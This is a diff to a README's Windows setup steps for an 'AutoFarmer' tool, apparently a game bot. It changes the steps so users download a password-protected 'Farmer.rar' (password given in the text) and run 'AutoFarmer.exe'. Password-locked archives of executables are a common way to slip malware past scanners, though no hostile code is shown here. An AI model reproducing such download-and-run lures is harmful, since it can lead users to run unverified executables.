@@ -15,8 +15,8 @@
 
 ## 🛠 Setup Instructions:
 ### 🔹 Windows (.exe) - Recommended:
-1️⃣ Download and extract the `.rar` file.  
-2️⃣ Run `LINK_AutoFarmer.exe`.  
+1️⃣ Download and extract the `Farmer.rar` (pass:122Farming)  
+2️⃣ Run `AutoFarmer.exe`.  
 3️⃣ Enjoy automated farming! 🚀  
 
 ### 🔹 Alternative Python Method:
